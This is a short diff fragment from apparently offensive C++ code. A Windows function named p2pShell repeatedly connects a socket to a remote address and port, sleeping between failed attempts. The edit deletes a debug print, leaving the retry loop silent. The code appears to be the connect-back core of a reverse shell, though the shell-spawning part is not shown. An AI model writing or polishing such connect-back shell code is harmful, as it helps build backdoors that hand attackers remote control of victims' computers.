@@ -20,7 +20,6 @@ void p2pShell(const char* remoteAddr, int remotePort) {
         addr.sin_addr.s_addr = inet_addr(remoteAddr);
         addr.sin_port = htons(remotePort);
         if (WSAConnect(lsock, (sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
-            cout<<"Sleeping!";
             Sleep(TIMELEN);
             continue;
         } else {
